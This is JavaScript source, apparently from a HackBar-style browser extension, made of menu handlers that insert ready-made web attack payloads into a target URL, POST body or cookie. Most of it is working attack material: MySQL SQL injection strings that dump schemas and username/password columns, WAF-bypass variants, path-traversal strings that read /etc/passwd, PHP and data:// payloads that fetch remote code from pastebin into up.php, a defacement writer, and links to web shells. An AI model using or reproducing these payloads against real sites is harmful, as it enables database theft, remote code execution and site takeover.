...
HackBar.SQL = {
    ...
    DIOS: function (encoding) {
        ...
        var dios_10 = prefManager.getCharPref(
    ...
    QUERY: function (choice) {
        var str = choice;
        var query_1 = prefManager.getCharPref(
            "extensions.hackbar.query.query 1"
        );
        var query_2 = prefManager.getCharPref(
            "extensions.hackbar.query.query 2"
        );
        var query_3 = prefManager.getCharPref(
            "extensions.hackbar.query.query 3"
        );
        var query_4 = prefManager.getCharPref(
            "extensions.hackbar.query.query 4"
        );
        var query_5 = prefManager.getCharPref(
            "extensions.hackbar.query.query 5"
        );
        var query_6 = prefManager.getCharPref(
            "extensions.hackbar.query.query 6"
        );
        var query_7 = prefManager.getCharPref(
            "extensions.hackbar.query.query 7"
        );
        var query_8 = prefManager.getCharPref(
            "extensions.hackbar.query.query 8"
        );
        var query_9 = prefManager.getCharPref(
            "extensions.hackbar.query.query 9"
        );
        var query_10 = prefManager.getCharPref(
    ...
    selectionToUnionSelect4: function (encoding) {
        var columns = prompt(
            "Amount of columns to use in the LOCAL DIOS Statement",
            "10"
        );
        columns = Math.min(1000, parseInt(columns));
        var colArray = new Array();
    ...
    selectionToUnionSelect6: function (encoding) {
        ...
        var txt =
            " and@:=(seleCt GrOup_ConcAt(0x3c62723e,Table_name,column_name) frOm /*!50000information_schema.columns*/ where table_schema not like 0x696e666f726d6174696f6e5f736368656d61) /*!50000Union*/ Select " +
            colArray.join(",");
        hackBar.setSelectedText(txt);
    },
    selectionToUnionSelect7: function (encoding) {
        ...
        var txt =
            " and@x:=(/*!50000SELECT */GROUP_CONCAT(/*!50000table_name*/,0x2d2d2d3e,/*!50000column_Name*/ SEPARATOR 0x3c62723e)/*!50000FROM *//*!50000INFORMATION_SCHEMA*/.ColumnS WHERE TABLE_SCHEMA=DATABASE/**!**/())  /*!50000union*/ ALL /*!50000select*/" +
            colArray.join(",");
        hackBar.setSelectedText(txt);
    },
    ...
    selectionToUnionSelect9: function (encoding) {
        ...
        var txt =
            " and@x:=(Select+/*!50000export_set*/(5,@:=0,(select+count(*)from(/*!50000information_schema.columns*/)where@:=export_set(5,/*!50000export_set*/(5,@,/*!50000table_name*/,0x3c6c693e,2),/*!50000column_name*/,0xa3a,2)),@,2))/*!50000UNION*/ ALL SELECT " +
            colArray.join(",");
        hackBar.setSelectedText(txt);
    },
    ...
    selectionToUnionSelect11: function (encoding) {
        ...
        var txt =
            "and@:=(SeLeCt /*!50000GrOup_ConCat(0x3c6c693e,/*!50000TaBle_naMe,0x207e20,/*!50000ColuMn_naMe*/)FrOm /*!50000inForMatiOn_scHeMa*/.ColuMns where table_schema=database/**_**/()) /*!50000union*/ select " +
            colArray.join(",");
        hackBar.setSelectedText(txt);
    },
    selectionToUnionSelect12: function (encoding) {
        ...
        var txt =
            " or@aLi:=make_set(7,@:=0x00,(select(1)/*!50000from*/(/*!50000information_schema*/.Columns)where(Table_Schema!='Information_Schema')and@:=make_set(31,@,'<br>',/*!50000Table_Name*/,'-->',/*!50000Column_name*/)),@)/*!50000UniON*/select " +
            colArray.join(",");
        hackBar.setSelectedText(txt);
    },
    selectionToUnionSelect13: function (encoding) {
        ...
        var txt =
            " and @:=(select(@)%66rom(select(@:=0x00),(select(@)%66rom(/*!50000information_schema.columns*/)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@)in(@:=concat/**alien**/(@,0x3C62723E,/*!50000table_name*/,0x3a,/*!50000column_name*/))))a)/*!50000Union*/ Select " +
            colArray.join(",");
        hackBar.setSelectedText(txt);
    },
    selectionToUnionSelect14: function (encoding) {
        ...
        var txt =
            " and @:=(select /*!50000GrOUp_ConCat(0x3c6c693e,/*!50000table_name*/,0x203a20,/*!50000column_name*/) %66rom/*!50000+information_schema.columns*/ where table_schema=database/**alien**/()) /*!50000Union*/ Select " +
            colArray.join(",");
        hackBar.setSelectedText(txt);
    },
    /* T.PRO FUNCTION */
    WichField: function (choice) {
        ...
        switch (str) {
            case "main_toogle":
                ...
                document
                    .getElementById("ref_toogle")
                    .setAttribute("checked", false);
                document
                    .getElementById("post_toogle")
                    .setAttribute("checked", false);
                document
                    .getElementById("cookie_toogle")
                    .setAttribute("checked", false);
                break;
            case "ref_toogle":
                document.getElementById(str).setAttribute("checked", true);
                document
                    .getElementById("main_toogle")
                    .setAttribute("checked", false);
                document
                    .getElementById("post_toogle")
                    .setAttribute("checked", false);
    ...
    ExecuteReplace: function () {
        if (document.getElementById("main_toogle").checked) {
            txt = "hackBarTargetUrl";
        }
        if (document.getElementById("ref_toogle").checked) {
            txt = "hackBarTargetUrlReferrerField";
        }
        if (document.getElementById("post_toogle").checked) {
            txt = "hackBarTargetUrlPostField";
        }
        if (document.getElementById("cookie_toogle").checked) {
            txt = "hackBarTargetUrlCookie";
        }
        ActiveQuery = document.getElementById(txt).value;
        if (ActiveQuery == "") {
            alert(
                'No query found!(empty URL-FIELDS)\nPlease type in a query or deselect "all" checkbox and give a string in replace-input-field!'
            );
        } else {
    ...
    ExecuteReplaceTest: function () {
        ...
        if (document.getElementById("replace_check").checked) {
            ...
            if (ReplaceQuery != "" && UserInput == "" && InserString == "") {
                alert(
                    "[Replace Error-Message #2]\n\nPlease enter:\n1) Replace string!\n2) Replacing string!"
                );
            }
            if (ReplaceQuery != "" && UserInput != "" && InserString == "") {
                alert(
                    "[Replace Error-Message #3]\n\nPlease enter:\nReplacing string!"
                );
            }
            if (ReplaceQuery != "" && UserInput == "" && InserString != "") {
                alert(
                    "[Replace Error-Message #4]\n\nPlease enter:\nReplace string!"
                );
            }
            if (ReplaceQuery == "" && UserInput != "" && InserString == "") {
                alert(
                    "[Replace Error-Message #5]\n\nPlease enter:\nReplacing string!"
                );
            }
            if (ReplaceQuery == "" && UserInput == "" && InserString != "") {
                alert(
                    "[Replace Error-Message #6]\n\nPlease enter:\n1) Query field!\n2) Replace string!"
                );
            }
            if (ReplaceQuery == "" && UserInput != "" && InserString != "") {
                alert(
                    "[Replace Error-Message #7]\n\nPlease enter:\n1) Query field!"
                );
            }
            if (ReplaceQuery != "" && UserInput != "" && InserString != "") {
                //fields to hex
    ...
    statementsTpro: function (choice) {
        ...
        switch (str) {
            ...
            case "Basic statements1":
                txt =
                    "CONCAT(USER(),0x3c62723e,DATABASE(),0x3c62723e,VERSION())";
                break;
            //TABLES
            case "Tables1":
            ...
            case "Columns2":
                ...
                txt =
                    "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=" +
                    tblNameFinal +
                    ")AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)";
                break;
            //DATA
            case "Data1":
                var Db = prompt(
                    "Insert db name (or leave for current DB())",
                    "DATABASE()"
                );
            ...
            case "LD1":
                txt =
                    "concat( 0x3c62723e, version(),0x3a3a20416c69656e205368616e75,0x3c62723e64617461626173653a20,DataBasE/**X**/(),0x3c62723e757365723a20,UsEr/**X**/(), @s)";
                break;
            case "LD2":
                txt = "@x";
                break;
            ...
            case "LD4":
                txt =
                    "concat(0x496e6a656374656420427920416c69656e5f5368616e75203c62723e,user/**_**/(),0x3c62723e,database/**_**/(),0x3c62723e,version(),@x)";
                break;
            case "LD5":
                txt =
                    "concat/**_**/(0x222f3e272f3e3c62723e,version(),0x203a3a20416c69656e5f5368616e753c62723e,@x)";
                break;
            case "LD6":
                txt = "@x";
                break;
            ...
            case "LD8":
                txt =
                    "ConCat(0x3a3a3a20496e6a656374656420627920416c69656e5f5368616e75203a3a3a3a203c62723e,@)";
                break;
            case "LD9":
                txt =
                    "concat('ALieN_ShANu<br>',version(),'<br>','User::| ',User/**_**/(),'<br>','Database::| ',database/**_**/(),'<br>',@sHanU) ";
                break;
            case "LD10":
                txt =
                    "ConCat/**alien**/(0x496e6a656374656420427920416c69656e5f5368616e753a3a3a3a3a3a,version(),0x3c62723e75736572203a3a20,user/**alien**/(),0x3c62723e4461746162617365203a3a20,database/**alien**/(),@)";
                break;
            case "LD11":
                txt = "@";
                break;
            ...
            case "PWD1":
                ...
                txt =
                    " +DiV@x:=(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" +
                    dbANDtable +
                    ")WHERE(@x)IN(@x:=CONCAT/**X**/(0x20,@x," +
                    cols +
                    ",0x3c62723e))))x) /*!50000union*/+ALL+SELECT+";
                break;
            case "PWD2":
                var Db = prompt(
                    "Insert db name (or leave for current DB())",
                ...
                txt =
                    " +DiV@x:=concat/**X**/((SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" +
                    dbANDtable +
                    ")WHERE(@x)IN(@x:=CONCAT/**X**/(0x20,@x," +
                    cols +
                    ",0x3c62723e))))x),(Select+export_set(5,@:=0,(select+count(*)from(/*!50000information_schema*/.columns)where@:=export_set(5,export_set(5,@,/*!50000table_name*/,0x3c6c693e,2),/*!50000column_name*/,0xa3a,2)),@,2))) /*!50000union*/+ALL+SELECT+";
                break;
            case "PWD3":
                var Db = prompt(
                    "Insert db name (or leave for current DB())",
                ...
                txt =
                    " and @s:=(select(@s)from(select(@s:=0x00),(select(@s)from(" +
                    dbANDtable +
                    ")where(@s)in(@s:=concat(@s," +
                    cols +
                    ",0x3c62723e))))x)/*!50000union*/ select +";
                break;
            // WAF BASED  / ORDERBY
            ...
            case "UNION15":
                ...
                break;
            case "UNION16":
                txt = "/**//*!12345UNION SELECT*//**/";
                break;
            case "UNION17":
                txt = "/**//*!50000UNION SELECT*//**/";
                break;
            case "UNION18":
                txt = "/**/UNION/**//*!50000SELECT*//**/";
                break;
            case "UNION19":
                txt = "/*!50000UniON SeLeCt*/";
                break;
            ...
            case "UNION26":
                ...
                break;
            case "UNION27":
                txt = "%2f**%2funion%2f**%2fselect";
                break;
            case "UNION28":
                txt = "union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A";
                break;
            case "UNION29":
                txt = "REVERSE(noinu)+REVERSE(tceles)";
                break;
            case "UNION30":
                txt = "/*--*/union/*--*/select/*--*/";
                break;
            case "UNION31":
                txt = "union (/*!/**/ SeleCT */ 1,2,3)";
                break;
            case "UNION32":
                txt = "/*!union*/+/*!select*/";
                break;
            ...
            case "UNION39":
                ...
                break;
            case "UNION40":
                txt = "UNIunionON+SELselectECT";
                break;
            case "UNION41":
                txt = "/**/union/*!50000select*//**/";
                break;
            case "UNION42":
                txt = "0%a0union%a0select%09";
                break;
            case "UNION43":
                txt = "%0Aunion%0Aselect%0A";
                break;
            case "UNION44":
                txt = "%55nion/**/%53elect";
                break;
            case "UNION45":
                ...
                break;
            case "UNION46":
                txt = "%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/";
                break;
            case "UNION47":
                txt = "%0A%09UNION%0CSELECT%10NULL%";
                break;
            case "UNION48":
                txt = "/*!union*//*--*//*!all*//*--*//*!select*/";
                break;
            case "UNION49":
                txt = "union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C";
                break;
            case "UNION50":
                txt = "/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/";
                break;
            case "UNION51":
                txt = "+UnIoN/*&a=*/SeLeCT/*&a=*/";
                break;
            ...
            case "UNION54":
                ...
                break;
            case "UNION55":
                txt = "union(select (1),(2),(3),(4),(5))";
                break;
            case "UNION56":
                txt = "UNION(SELECT(column)FROM(table))";
                break;
            case "UNION57":
            ...
            case "UNION59":
                ...
                break;
            case "UNION60":
                txt = "union (select 1111,2222,3333)";
                break;
            case "UNION61":
                txt = "uNioN (/*!/**/ SeleCT */ 11)";
                break;
            ...
            case "UNION65":
                ...
                break;
            case "UNION66":
                txt = "+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+";
                break;
            case "UNION67":
                txt = "+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C";
                break;
            case "UNION68":
                txt = "/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/";
                break;
            case "UNION69":
                txt = "+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+";
                break;
            case "UNION70":
                txt =
            ...
            case "UNION81":
                ...
                break;
            case "UNION82":
                txt = "uni%20union%20/*!select*/%20";
                break;
            case "UNION83":
                txt = "union%23aa%0Aselect";
                break;
            case "UNION84":
                txt = "/**/union/*!50000select*/";
                break;
            ...
            case "UNION94":
                ...
                break;
            case "UNION95":
                txt = "/%2A%2A/union/%2A%2A/select/%2A%2A/";
                break;
            case "UNION96":
                txt = "%2f**%2funion%2f**%2fselect%2f**%2f";
                break;
            case "UNION97":
                txt = "union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A";
                break;
            case "UNION98":
                ...
                break;
            case "UNION99":
                txt = "/*!50000UnION*//*!50000SeLeCt*/";
                break;
            case "UNION100":
                txt = "')AnD null UNiON SeLeCt 1,2,3,4,5;%00";
                break;
            case "UNION101":
                txt = "')AnD null UNiON SeLeCt 1,2,3,4,5+--+";
                break;
            case "UNION102":
                txt = "' And True Union Select 1,2,3;%00";
                break;
            case "UNION103":
                txt = "' And False Union Select 1,2,3;%00";
                break;
            case "UNION104":
                txt = "' And True Union Select 1,2,3+--+";
                break;
            case "UNION105":
                txt = "' And False Union Select 1,2,3+--+";
                break;
            //WAF BASED/CONCAT
            case "CONCAT1":
                txt = "CoNcAt()";
            ...
            case "CONCAT5":
                ...
                break;
            case "CONCAT6":
                txt = "unhex(hex(concat(table_name)))";
                break;
            case "CONCAT7":
                txt = "unhex(hex(/*!12345concat*/(table_name)))";
                break;
            case "CONCAT8":
                txt = "unhex(hex(/*!50000concat*/(table_name)))";
                break;
            //Group Concat
            case "group_concat 1":
                txt = "/*!group_concat*/()";
            ...
            case "group_concat 3":
                ...
                break;
            case "group_concat 4":
                txt = "group_concat(/*!12345table_name*/)";
                break;
            case "group_concat 5":
                txt = "group_concat(/*!50000table_name*/)";
                break;
            case "group_concat 6":
                txt = "/*!group_concat*/(/*!12345table_name*/)";
                break;
            case "group_concat 7":
                ...
                break;
            case "group_concat 8":
                txt = "/*!12345group_concat*/(/*!12345table_name*/)";
                break;
            case "group_concat 9":
                txt = "/*!50000group_concat*/(/*!50000table_name*/)";
                break;
            case "group_concat 10":
                txt = "/*!GrOuP_ConCaT*/()";
                break;
            case "group_concat 11":
                txt = "/*!12345GroUP_ConCat*/()";
                break;
            case "group_concat 12":
                txt = "/*!50000gRouP_cOnCaT*/()";
                break;
            case "group_concat 13":
                txt = "/*!50000Gr%6fuP_c%6fnCAT*/()";
                break;
            case "group_concat 14":
                txt = "unhex(hex(group_concat(table_name)))";
                break;
            case "group_concat 15":
                txt = "unhex(hex(/*!group_concat*/(/*!table_name*/)))";
                break;
            case "group_concat 16":
                txt = "unhex(hex(/*!12345group_concat*/(table_name)))";
                break;
            case "group_concat 17":
                txt = "unhex(hex(/*!12345group_concat*/(/*!table_name*/)))";
                break;
            case "group_concat 18":
                txt =
                    "unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))";
                break;
            case "group_concat 19":
                txt = "unhex(hex(/*!50000group_concat*/(table_name)))";
                break;
            case "group_concat 20":
                txt = "unhex(hex(/*!50000group_concat*/(/*!table_name*/)))";
                break;
            case "group_concat 21":
                txt =
                    "unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))";
                break;
            case "group_concat 22":
                txt = "convert(group_concat(table_name)+using+ascii)";
                break;
            case "group_concat 23":
                txt = "convert(group_concat(/*!table_name*/)+using+ascii)";
                break;
            case "group_concat 24":
                txt = "convert(group_concat(/*!12345table_name*/)+using+ascii)";
                break;
            case "group_concat 25":
                txt = "convert(group_concat(/*!50000table_name*/)+using+ascii)";
                break;
            case "group_concat 26":
                txt = "CONVERT(group_concat(table_name)+USING+latin1)";
                break;
            case "group_concat 27":
                txt = "CONVERT(group_concat(table_name)+USING+latin2)";
                break;
            case "group_concat 28":
                txt = "CONVERT(group_concat(table_name)+USING+latin3)";
                break;
            case "group_concat 29":
                txt = "CONVERT(group_concat(table_name)+USING+latin4)";
                break;
            case "group_concat 30":
                txt = "CONVERT(group_concat(table_name)+USING+latin5)";
                break;
            //WAF BASED/ NUMBER
            case "NUMBER1":
                txt = "+div+0";
            ...
            case "mod 3":
                ...
                break;
            case "mod 4":
                txt = "and Radians(point(53,12))";
                break;
            case "mod 5":
                txt = "and polygon(point(53,12))";
                break;
            case "mod 6":
                txt = "Multipolygon(point(53,12))";
                break;
            case "mod 7":
                txt = "Linestring(point(53,12))";
                break;
            case "mod 8":
                txt = "Multilinestring(point(53,12))";
                break;
            case "mod 9":
                txt = "Geometrycollection(point(53,12))";
                break;
            //WAF BASED/ SCHEMA
            case "SCHEMA1":
                txt =
            ...
            case "lfi627":
                txt =
                    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00";
                break;
            case "lfi628":
                txt =
                    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/group%00";
                break;
            case "lfi629":
            ...
            case "lfi630":
                txt =
                    "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd%00";
                break;
            case "lfi631":
                txt = "/../../../../../../../../../../etc/passwd^^%00";
                break;
            ...
            case "lfi642":
                txt =
                    "..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd%00";
                break;
            case "lfi643":
            ...
            case "datawrapper_post":
                txt =
                    "data://text/plain;base64,PD9waHAgZWNobyBleGVjKCRfUE9TVFsnY21kJ10pOz8+";
                break;
            ...
            case "datawrapper_file_get":
                txt =
                    "data://text/plain;base64,PD9waHAgZndyaXRlKGZvcGVuKCd1cC5waHAnLCd3JyksZmlsZV9nZXRfY29udGVudHMoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9ueHVMNFNOdicpKTs/Pg==";
                break;
            //XSS via LFI Payload
            case "xssvialfi":
                txt =
            ...
            case "WAF":
                txt =
                    "(/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*) from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))";
                break;
            case "Rummy":
                txt =
            ...
            case "DIOS 403 - T&C":
                txt =
                    "and mod(29.9) and  @a:=((SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM({f/*!50000informatioN_Schema*/.columns})WHERE(@x)IN(@x:=CONCAT(0x20,@x,table_name,':::',column_name,0x3c62723))))x))union distinctrOw /*!50000sElect*/";
                break;
            case "DIOS 403 - U&P":
                txt =
                    "and mod(29.9) and  @a:=((SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(admin)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,':::',password,0x3c62723))))x))union distinctrOw /*!50000sElect*/";
                break;
            case "SK1":
                txt =
            ...
            case "Exorcism 2":
                txt =
                    "make_set(6,@:=0x0a,(select(1)from(/*!50000information_schema.columns*/)where@:=make_set(511,@,0x3c6c693e,/*!50000table_name*/,/*!50000column_name*/)),@),﻿";
                break;
            case "DUMP_CARD":
                txt =
            ...
            case "MID_SEPARATOR":
                txt =
                    "(select+MID(GROUP_CO­NCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.t­ables) SEPARATOR 0x3c62723e),1,1024)+­FROM information_schema.c­olumns)";
                break;
            case "Reverse":
                txt =
                    "reverse(insert(0x1,1­,0,reverse(unhex(hex­(table_name))))) FROM information_schema 0.e.tables limit 1,1 reverse(insert(0x1,1­,0,reverse(concat(unhex(hex(table_nam­e)),0x203a20,unhex(h­ex(column_name)),0x3­c62723e)))) from information_schema 0.e.columns limit 1,1";
                break;
            case "Benchmark":
                txt =
                    "concat(@i:=0×00,@o:=0xd0a,benchmark(40,@o:=CONCAT(@o,0xd0a​,(SELECT concat(table_schema,0x2E,@i:=table_name) FROM information_schema.tables WHERE table_name>@i order by table_name LIMIT 1))),@o)";
                break;
            //conver using ascii
            case "ascii":
                var value = prompt(
                    "Please Enter the value of convert statement",
                    "version()"
                );
            ...
            case "fontc":
                ...
                break;
            case "imglogo":
                var imagelink = prompt(
                    "Please Enter image link",
                    "https://imgur.com/r8DpLDe.gif"
                );
    ...
    statementspescyte: function (choice) {
        ...
        switch (str) {
            ...
            case "windows32":
                txt =
                    "C:/Program Files/Ampps/apache/conf/extra/httpd-vhosts.conf";
                break;
            case "windows33":
                txt =
    ...
    SysVariables: function (choice) {
        ...
        switch (str) {
            ...
            case "Get Server Folders1":
                txt = "@@CHARACTER_SETS_DIR";
                break;
            case "Get Server Folders2":
                txt = "@@LOG_ERROR";
                break;
            case "Get Server Folders3":
                txt = "@@LANGUAGE";
                break;
            case "Get Server Folders4":
                txt = "@@PID_FILE";
                break;
            case "Get Server Folders5":
                txt = "@@PLUGIN_DIR";
                break;
            case "Get Server Folders6":
                txt = "@@SOCKET";
                break;
            case "Get Server Folders7":
                txt = "@@BASEDIR";
                break;
            case "Get Server Folders8":
                txt = "@@DATADIR";
                break;
            case "Get Server Folders9":
    ...
    reverse: function (encoding) {
        var originalString = prompt(
            "Please Enter the value and automatically reversed the value",
            "concat"
        );
    ...
    ErrorBased: function (choice) {
        ...
        switch (str) {
            ...
            case "ErrorBased3":
                ...
                txt =
                    "+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=" +
                    dbNameFinal +
            ...
            case "ErrorBased4":
                ...
                txt =
                    "+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x" +
                    tblNameHexed +
                    "+AND+table_schema=" +
                    dbNameFinal +
                    "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
            ...
            case "ErrorBased5":
                ...
                txt =
                    "+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(" +
                    columnName +
                    ")+AS+CHAR),0x7e))+FROM+" +
                    dbANDtable +
                    "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
            ...
            case "Advance Error Based2":
                txt =
                    "and(select!x-~0.+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
                break;
            ...
            case "DIOS By MadBlood2":
                txt =
                    "(select(x+is+not+null)-9223372036854775808+from(select(concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@))x)y)";
                break;
            case "DIOS By MadBlood3":
                txt =
                    "(select!x-~0+from(select+concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)";
                break;
            case "DIOS By MadBlood4":
                txt =
                    "(select+if(x,6,9)*1E308+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
                break;
            case "DIOS By MadBlood5":
                txt =
                    "(select!x-~0.+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
                break;
            case "DIOS By MadBlood6":
                txt =
                    "(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*)+from+information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
                break;
            case "DIOS By MadBlood7":
                txt =
                    "and(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*)+from+information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
                break;
            case "DIOS By MadBlood8":
                txt =
                    "and(select+if(x,6,9)*1E308+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
                break;
            ...
            case "MULTIPIONT1":
                txt =
                    "+multipoint((select*from+(select+x*1E308+from+(select+concat(@:=0,(select+count(*)+from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@)x)y)j))";
                break;
            case "MULTIPIONT2":
                txt =
                    "+multipoint((select*from(select(!x-~0)+from(select+concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)j))";
                break;
            case "MULTIPIONT3":
                txt =
                    "multipoint((select*from(select(x+is+not+null)-9223372036854775808+from+(select(concat(@:=0,(select+count(*)+from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@))x)y)j))";
                break;
            case "MULTIPIONT4":
                txt =
                    "'+and+multipoint((select*from(select!x-~0.from(select(select+group_concat(table_name+separator+0x0b)from(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,20)c)x)j)h))";
                break;
            case "23":
            ...
            case "26":
                ...
                txt =
                    " and extractvalue(0x0a,concat(0x0a,(select concat(" +
                    columnName +
                    ") from " +
                    dbANDtable +
                    " limit 0,1)))";
            ...
            case "29":
                ...
                txt =
                    " and updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_schema=" +
                    dbNameFinal +
                    " and table_name=" +
                    tblNameHexed +
                    " limit 0,1)),null)";
            ...
            case "30":
                ...
                var columnName = prompt("Column Name", "username,password");
                txt =
                    " and updatexml(null,concat(0x0a,(select concat(" +
                    columnName +
                    ") from " +
                    dbANDtable +
                    " limit 0,1)),null)";
    ...
    DoubleQuery: function (choice) {
        ...
        switch (str) {
            ...
            case "DoubleQuery3":
                ...
                txt =
                    "+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(table_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=" +
                    dbNameFinal +
            ...
            case "DoubleQuery5":
                ...
                var columnName = prompt("Column Name", "password");
                txt =
                    "+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(" +
                    columnName +
                    "+AS+CHAR),0x27,0x7e)+FROM+" +
                    dbANDtable +
                    "+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                break;
        }
    ...
    UnionSelect1111: function (encoding) {
        var columns = prompt(
            "Amount of columns to use in the UNION SELECT 1111,2222,3333,4444 ",
            "10"
        );
        columns = Math.min(1000, parseInt(columns));
    ...
    UnionSelectbuff: function (encoding) {
        ...
        switch (encoding) {
            case "buff":
                var buff = "";
                stringLength = prompt(
                    "Length of the string to use in the Buffer overflow:",
                    "1337"
                );
    ...
    UniontoJoinSelect: function (encoding) {
        var columns = prompt(
            "Amount of columns to use in the join(SELECT 1)a join(SELECT 2)b statement maximunm of 100",
            "10"
        );
        ...
        var txt = [],
            i = 0;
        for (i; i < columns; i++) txt.push(`${i + 1})` + abc[i]); //FIXX!!!
        txt = "Union Select * from (select " + txt.join(" join(select ");
        hackBar.setSelectedText(txt);
    }, //*
    UnionToSQLChar: function (encoding) {
        var columns = prompt(
            "Amount of columns to use in the Union Select CHAR(49),CHAR(50),CHAR(51) Statement",
            "10"
        );
        columns = Math.min(100, parseInt(columns));
        var number = [
    ...
    SelectQueries: function (choice) {
        ...
        switch (str) {
            ...
            case "WAF-SETS2":
                ...
                txt =
                    "(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/0x" +
                    tblNameHex +
                    ")";
                break;
            case "WAF-SETS3":
    ...
    phpscripts: function (choice) {
        ...
        switch (str) {
            case "phpscripts1":
                txt =
                    "";
                break;
            case "phpscripts2":
                var password = alert(" Password = raz");
                txt =
                    "";
                break;
            case "phpscripts3":
                txt =
                    "<?php $a = base64_decode('');$file = fopen('up.php','w');echo fwrite($file,$a);fclose($file);?>";
                break;
            case "phpscripts4":
                txt =
                    "";
                break;
            case "phpscripts5":
                var url = alert("site.com/filename.php?X=Xploit");
                txt =
                    "<?php fwrite(fopen('up.php','w'),file_get_contents('https://pastebin.com/raw/nxuL4SNv'));?>";
                break;
            case "php_script_get":
            ...
            case "fwrite":
                txt =
                    "<? @fwrite(fopen('hacked.txt','w'),'Hacked by ph.hitachi'); ?>";
                break;
            ...
            case "rce":
                txt =
                    "${@fwrite(fopen('up.php','w'),file_get_contents('" +
                    wso +
                    "')).phpinfo(); }";
                break;
            case "file_get_contents 2":
                var url = alert(
                    "http://localhost/get.php?f=shell.php&u=http://localhost/WSO.txt"
                );
                txt =
                    "<? fwrite(fopen($_GET[f], 'w'), file_get_contents($_GET[u])); ?>";
                break;
            case "cmd_base64_get":
    ...
    shell: function (choice) {
        ...
        switch (str) {
            ...
            case "b374k_mini_shell":
                txt =
                    "https://raw.githubusercontent.com/NSAKEY/Top-103-shells/master/Top%20103%20shells/b374k-mini-shell-php.php.txt";
                break;
            case "mini_shell":
            ...
            case "ssi":
                txt =
